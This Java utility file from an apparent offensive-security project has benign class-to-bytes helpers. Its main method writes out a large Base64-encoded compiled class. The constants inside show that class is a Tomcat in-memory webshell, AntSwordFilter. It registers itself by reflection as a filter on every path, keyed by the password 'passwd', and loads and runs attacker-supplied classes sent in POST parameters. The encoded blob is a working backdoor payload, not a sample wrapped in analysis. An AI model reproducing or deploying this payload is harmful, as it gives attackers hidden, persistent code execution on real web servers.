package org.erosion2020.util;

import java.io.*;
import java.util.Base64;

public class ClassFiles {
	public static String classAsFile(final Class<?> clazz) {
		return classAsFile(clazz, true);
	}
	
	public static String classAsFile(final Class<?> clazz, boolean suffix) {
		String str;
		if (clazz.getEnclosingClass() == null) {
			str = clazz.getName().replace(".", "/");
		} else {
			str = classAsFile(clazz.getEnclosingClass(), false) + "$" + clazz.getSimpleName();
		}
		if (suffix) {
			str += ".class";			
		}
		return str;  
	}

	public static byte[] classAsBytes(final Class<?> clazz) {
		try {
			final byte[] buffer = new byte[1024];
			final String file = classAsFile(clazz);
			final InputStream in = ClassFiles.class.getClassLoader().getResourceAsStream(file);
			if (in == null) {
				throw new IOException("couldn't find '" + file + "'");
			}
			final ByteArrayOutputStream out = new ByteArrayOutputStream();
			int len;
			while ((len = in.read(buffer)) != -1) {
				out.write(buffer, 0, len);
			}
			return out.toByteArray();
		} catch (IOException e) {
			throw new RuntimeException(e);
		}
	}

	public static void base64JavaClass2File(String base64Data, File target){
		boolean classFile = target.getPath().endsWith(".class");
		if(!classFile){
			throw new RuntimeException("错误的 .class文件路径" + target.getPath());
		}
		// 解码 Base64 数据
		byte[] classData = Base64.getDecoder().decode(base64Data);
		// 写入Class文件
		try (FileOutputStream fos = new FileOutputStream(target)) {
			fos.write(classData);
			System.out.println("Class file decoded successfully!");
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	public static void main(String[] args) {
		base64JavaClass2File("yv66vgAAADQBSQoAGwCqCgAjAKsHAKwKACMArQcArgoABQCqCACvCgAFALAIALEKAAUAsgoAAwCzCwBTALQHALUHALYIALcLAA0AuAoAJAC5CQA7ALoLAA0AuwcAvAoAGwC9CgAjAL4KABQAvwoAOwDACgAUAMEKACMAwgcAwwoAGwDEBwDFCgAdAMYLAMcAyAgAyQoAIwDKCADLBwDMBwDNCgAjAM4KAM8A0AcAkAgA0QgA0ggA0wsAUwDUBwDVCgAsAKoJADsA1gkAOwDXCgDYANkKANgA2gcA2woAMgDcCwDdAN4HAN8IAJwKADsA4AoA4QDiCgDhAOMHAOQHAOUKADsAqgcA5goAPQCqCgA9AOcJADsA6AoAPQDpCgAjAOoKAD0A6woANQDsBwDtCgBFAKoKAEUA7goARQDpCQDvAPAKAO8A8QoARQDyCgA1APMHAPQHAPUKACMA9goA9wDiCgD3APgLADoA+QcA+gEAAVUBAAxJbm5lckNsYXNzZXMBAAZsb2FkZWQBAA9MamF2YS91dGlsL01hcDsBAAlTaWduYXR1cmUBADdMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0NsYXNzPCo+Oz47AQAEbmFtZQEAEkxqYXZhL2xhbmcvU3RyaW5nOwEAB3BhdHRlcm4BAAhwYXNzd29yZAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAR0aGlzAQApTG9yZy9lcm9zaW9uMjAyMC9tZW1zaGVsbC9BbnRTd29yZEZpbHRlcjsBAAlmaW5kRmllbGQBAD4oTGphdmEvbGFuZy9DbGFzcztMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEAB2lnbm9yZWQBACBMamF2YS9sYW5nL05vU3VjaEZpZWxkRXhjZXB0aW9uOwEABWNsYXp6AQARTGphdmEvbGFuZy9DbGFzczsBABZMb2NhbFZhcmlhYmxlVHlwZVRhYmxlAQAUTGphdmEvbGFuZy9DbGFzczwqPjsBAA1TdGFja01hcFRhYmxlBwCsAQAKRXhjZXB0aW9ucwEAQShMamF2YS9sYW5nL0NsYXNzPCo+O0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQAEaW5pdAEAHyhMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7KVYBAAxmaWx0ZXJDb25maWcBABxMamF2YXgvc2VydmxldC9GaWx0ZXJDb25maWc7BwD7AQAIZG9GaWx0ZXIBAFsoTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7TGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlO0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOylWAQADY2xzAQABZQEAFUxqYXZhL2xhbmcvRXhjZXB0aW9uOwEADnNlcnZsZXRSZXF1ZXN0AQAeTGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3Q7AQAPc2VydmxldFJlc3BvbnNlAQAfTGphdmF4L3NlcnZsZXQvU2VydmxldFJlc3BvbnNlOwEAC2ZpbHRlckNoYWluAQAbTGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47AQAHcmVxdWVzdAEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEACHJlc3BvbnNlAQAoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlOwcAtQcAtgcAxQcA/AEADGJhc2U2NERlY29kZQEAFihMamF2YS9sYW5nL1N0cmluZzspW0IBAAdkZWNvZGVyAQASTGphdmEvbGFuZy9PYmplY3Q7AQAGYmFzZTY0AQADc3RyAQAFdmFsdWUBAAJbQgcA5QcAzQEAB2Rlc3Ryb3kBAAg8Y2xpbml0PgEACnVybFBhdHRlcm4BAAZsb2FkZXIBADJMb3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvV2ViYXBwQ2xhc3NMb2FkZXJCYXNlOwEAB2NvbnRleHQBACpMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL1N0YW5kYXJkQ29udGV4dDsBABJmaWx0ZXJDb25maWdzRmllbGQBABlMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANZmlsdGVyQ29uZmlncwEABmZpbHRlcgEACWZpbHRlckRlZgEAMUxvcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlckRlZjsBAAlmaWx0ZXJNYXABADFMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJNYXA7AQALY29uc3RydWN0b3IBAB9MamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAGY29uZmlnAQAyTG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9BcHBsaWNhdGlvbkZpbHRlckNvbmZpZzsBAFVMamF2YS91dGlsL01hcDxMamF2YS9sYW5nL1N0cmluZztMb3JnL2FwYWNoZS9jYXRhbGluYS9jb3JlL0FwcGxpY2F0aW9uRmlsdGVyQ29uZmlnOz47AQBTTGphdmEvbGFuZy9yZWZsZWN0L0NvbnN0cnVjdG9yPExvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25GaWx0ZXJDb25maWc7PjsBAApTb3VyY2VGaWxlAQATQW50U3dvcmRGaWx0ZXIuamF2YQwAXgBfDAD9AP4BAB5qYXZhL2xhbmcvTm9TdWNoRmllbGRFeGNlcHRpb24MAP8BAAEAF2phdmEvbGFuZy9TdHJpbmdCdWlsZGVyAQAGRmllbGQgDAEBAQIBAAsgbm90IGZvdW5kLgwBAwEEDABeAQUMAHEAcgEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QBACZqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZQEABFBPU1QMAQYBBAwBBwEIDABdAFsMAQkBCgEAKW9yZy9lcm9zaW9uMjAyMC9tZW1zaGVsbC9BbnRTd29yZEZpbHRlciRVDAELAQAMAQwBDQwAXgEODACJAIoMAQ8BEAwBEQESAQAQamF2YS9sYW5nL09iamVjdAwBEwEUAQATamF2YS9sYW5nL0V4Y2VwdGlvbgwBFQBfBwEWDAB2ARcBABZzdW4ubWlzYy5CQVNFNjREZWNvZGVyDAEYARkBAAxkZWNvZGVCdWZmZXIBAA9qYXZhL2xhbmcvQ2xhc3MBABBqYXZhL2xhbmcvU3RyaW5nDAEGARoHARsMARwBHQEAEGphdmEudXRpbC5CYXNlNjQBAApnZXREZWNvZGVyAQAGZGVjb2RlDACTAF8BACZqYXZhL3V0aWwvY29uY3VycmVudC9Db25jdXJyZW50SGFzaE1hcAwAVgBXDABcAFsHAR4MAR8BIAwBIQENAQAwb3JnL2FwYWNoZS9jYXRhbGluYS9sb2FkZXIvV2ViYXBwQ2xhc3NMb2FkZXJCYXNlDAEiASMHASQMASUBJgEAKG9yZy9hcGFjaGUvY2F0YWxpbmEvY29yZS9TdGFuZGFyZENvbnRleHQMAGUAZgcBJwwBKAEpDAEqASsBAA1qYXZhL3V0aWwvTWFwAQAnb3JnL2Vyb3Npb24yMDIwL21lbXNoZWxsL0FudFN3b3JkRmlsdGVyAQAvb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJEZWYMASwBLQwAWgBbDAEuAQUMAS8BBAwBMAEFDAExATIBAC9vcmcvYXBhY2hlL3RvbWNhdC91dGlsL2Rlc2NyaXB0b3Ivd2ViL0ZpbHRlck1hcAwBMwEFBwE0DAE1ATYMAFoBBAwBNwEFDAE4ATkBADBvcmcvYXBhY2hlL2NhdGFsaW5hL2NvcmUvQXBwbGljYXRpb25GaWx0ZXJDb25maWcBABtvcmcvYXBhY2hlL2NhdGFsaW5hL0NvbnRleHQMAToBOwcBPAwBEQE9DAE+AT8BABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAE2phdmEvaW8vSU9FeGNlcHRpb24BABBnZXREZWNsYXJlZEZpZWxkAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL3JlZmxlY3QvRmllbGQ7AQANZ2V0U3VwZXJjbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBAAZhcHBlbmQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVpbGRlcjsBAAh0b1N0cmluZwEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAVKExqYXZhL2xhbmcvU3RyaW5nOylWAQAJZ2V0TWV0aG9kAQAQZXF1YWxzSWdub3JlQ2FzZQEAFShMamF2YS9sYW5nL1N0cmluZzspWgEADGdldFBhcmFtZXRlcgEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQAIZ2V0Q2xhc3MBAA5nZXRDbGFzc0xvYWRlcgEAGSgpTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAEMoTG9yZy9lcm9zaW9uMjAyMC9tZW1zaGVsbC9BbnRTd29yZEZpbHRlcjtMamF2YS9sYW5nL0NsYXNzTG9hZGVyOylWAQABZwEAFShbQilMamF2YS9sYW5nL0NsYXNzOwEAC25ld0luc3RhbmNlAQAUKClMamF2YS9sYW5nL09iamVjdDsBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAA9wcmludFN0YWNrVHJhY2UBABlqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluAQBAKExqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0O0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTspVgEAB2Zvck5hbWUBACUoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvQ2xhc3M7AQBAKExqYXZhL2xhbmcvU3RyaW5nO1tMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kOwEAGGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZAEABmludm9rZQEAOShMamF2YS9sYW5nL09iamVjdDtbTGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwEAEGphdmEvbGFuZy9UaHJlYWQBAA1jdXJyZW50VGhyZWFkAQAUKClMamF2YS9sYW5nL1RocmVhZDsBABVnZXRDb250ZXh0Q2xhc3NMb2FkZXIBAAxnZXRSZXNvdXJjZXMBACcoKUxvcmcvYXBhY2hlL2NhdGFsaW5hL1dlYlJlc291cmNlUm9vdDsBACNvcmcvYXBhY2hlL2NhdGFsaW5hL1dlYlJlc291cmNlUm9vdAEACmdldENvbnRleHQBAB8oKUxvcmcvYXBhY2hlL2NhdGFsaW5hL0NvbnRleHQ7AQAXamF2YS9sYW5nL3JlZmxlY3QvRmllbGQBAA1zZXRBY2Nlc3NpYmxlAQAEKFopVgEAA2dldAEAJihMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQAJc2V0RmlsdGVyAQAZKExqYXZheC9zZXJ2bGV0L0ZpbHRlcjspVgEADXNldEZpbHRlck5hbWUBAAdnZXROYW1lAQAOc2V0RmlsdGVyQ2xhc3MBAAxhZGRGaWx0ZXJEZWYBADQoTG9yZy9hcGFjaGUvdG9tY2F0L3V0aWwvZGVzY3JpcHRvci93ZWIvRmlsdGVyRGVmOylWAQANYWRkVVJMUGF0dGVybgEAHGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGUBAAdSRVFVRVNUAQAeTGphdmF4L3NlcnZsZXQvRGlzcGF0Y2hlclR5cGU7AQANc2V0RGlzcGF0Y2hlcgEAEmFkZEZpbHRlck1hcEJlZm9yZQEANChMb3JnL2FwYWNoZS90b21jYXQvdXRpbC9kZXNjcmlwdG9yL3dlYi9GaWx0ZXJNYXA7KVYBABZnZXREZWNsYXJlZENvbnN0cnVjdG9yAQAzKFtMamF2YS9sYW5nL0NsYXNzOylMamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3I7AQAdamF2YS9sYW5nL3JlZmxlY3QvQ29uc3RydWN0b3IBACcoW0xqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAANwdXQBADgoTGphdmEvbGFuZy9PYmplY3Q7TGphdmEvbGFuZy9PYmplY3Q7KUxqYXZhL2xhbmcvT2JqZWN0OwkAkQDoAQAFSGVsbG8IAUEJAJEA1wEAAi8qCAFECQCRALoBAAZwYXNzd2QIAUcAIQA7ABsAAQBTAAQACABWAFcAAQBYAAAAAgBZAAkAWgBbAAAACQBcAFsAAAAJAF0AWwAAAAcAAQBeAF8AAQBgAAAALwABAAEAAAAFKrcAAbEAAAACAGEAAAAGAAEAAAAUAGIAAAAMAAEAAAAFAGMAZAAAAAoAZQBmAAMAYAAAAK0ABAADAAAAMyrGABIqK7YAArBNKrYABEun//C7AANZuwAFWbcABhIHtgAIK7YACBIJtgAItgAKtwALvwABAAQACQAKAAMABABhAAAAGgAGAAAAQgAEAEQACgBFAAsARgAQAEcAEwBJAGIAAAAgAAMACwAFAGcAaAACAAAAMwBpAGoAAAAAADMAWgBbAAEAawAAAAwAAQAAADMAaQBsAAAAbQAAAAgAAwBJBwBuCABvAAAABAABAAMAWAAAAAIAcAABAHEAcgACAGAAAAA+AAIAAgAAAAYqK7cADLEAAAACAGEAAAAKAAIAAABNAAUATgBiAAAAFgACAAAABgBjAGQAAAAAAAYAcwB0AAEAbwAAAAQAAQB1AAEAdgB3AAIAYAAAARwABQAHAAAAbivAAA06BCzAAA46BRIPGQS5ABABALYAEZkASxkEsgASuQATAgA6BhkGxgAwuwAUWSoqtgAVtgAWtwAXKhkGtgAYtgAZtgAaBb0AG1kDGQRTWQQZBVO2ABxXpwAKOgYZBrYAHi0ZBBkFuQAfAwCxAAEAGwBZAFwAHQADAGEAAAAmAAkAAABbAAYAXAAMAF0AGwBfACcAYAAsAGEAWQBjAGMAZQBtAGYAYgAAAFIACAAnADIAeABbAAYAXgAFAHkAegAGAAAAbgBjAGQAAAAAAG4AewB8AAEAAABuAH0AfgACAAAAbgB/AIAAAwAGAGgAgQCCAAQADABiAIMAhAAFAG0AAAAQAAP9AFkHAIUHAIZCBwCHBgBvAAAABgACAIgAdQABAIkAigACAGAAAAFaAAYABgAAAHwBThIguAAhTSy2ABo6BBkEtgAVEiIEvQAjWQMSJFO2ACUZBAS9ABtZAytTtgAmwAAnwAAnTqcARToEEii4ACFNLBIpAbYAJSwBtgAmOgUZBbYAFRIqBL0AI1kDEiRTtgAlGQUEvQAbWQMrU7YAJsAAJ8AAJ06nAAU6BS2wAAIAAgA1ADgAHQA6AHUAeAAdAAMAYQAAAC4ACwAAAGoAAgBsAAgAbQAOAG4ANQB1ADgAbwA6AHEAQAByAE4AcwB1AHQAegB2AGIAAABSAAgADgAnAIsAjAAEAAgAMACNAGoAAgBOACcAiwCMAAUAQAA4AI0AagACADoAQAB5AHoABAAAAHwAYwBkAAAAAAB8AI4AWwABAAIAegCPAJAAAwBtAAAAMAAD/wA4AAQHAJEHAJIABwAnAAEHAIf/AD8ABQcAkQcAkgAHACcHAIcAAQcAh/oAAQBvAAAABAABAB0AAQCTAF8AAQBgAAAAMwABAAEAAAAFKrcAK7EAAAACAGEAAAAKAAIAAAB7AAQAfABiAAAADAABAAAABQBjAGQAAAAIAJQAXwABAGAAAAIQAAUACgAAAPATAUKzAUATAUWzAUMTAUizAUa7ACxZtwAtswAusgAvS7gAMLYAMcAAMkwrtgAzuQA0AQDAADVNLLYAFRI2uAA3Ti0EtgA4LSy2ADnAADo6BLsAO1m3ADw6BbsAPVm3AD46BhkGGQW2AD8ZBrIAQLYAQRkGGQW2ABW2AEK2AEMsGQa2AES7AEVZtwBGOgcZByq2AEcZB7IAQLYASBkHsgBJtgBKtgBLLBkHtgBMEk0FvQAjWQMSTlNZBBI9U7YATzoIGQgEtgBQGQgFvQAbWQMsU1kEGQZTtgBRwABNOgkZBLIAQBkJuQBSAwBXpwAES7EAAQAcAOsA7gAdAAQAYQAAAGoAGgASABYAHAAdACAAIAAqACEANwAjAEEAJABGACYASAAnAFAAKgBZACsAYgAsAGkALQBxAC4AfgAvAIQAMgCNADMAkwA0AJsANQCmADYArAA5ALwAOgDBADsAxwA8AN4APQDrAD8A7wBAAGIAAABmAAoAIADLAJUAWwAAACoAwQCWAJcAAQA3ALQAmACZAAIAQQCqAJoAmwADAFAAmwCcAFcABABZAJIAnQBkAAUAYgCJAJ4AnwAGAI0AXgCgAKEABwDBACoAogCjAAgA3gANAKQApQAJAGsAAAAWAAIAUACbAJwApgAEAMEAKgCiAKcACABtAAAADgAC9wDuBwCH/AAABwAbAAIAqAAAAAIAqQBVAAAACgABABQAOwBUAAA=",
				new File("C:\\Users\\erosi\\Desktop\\hello.class"));
	}

	
}
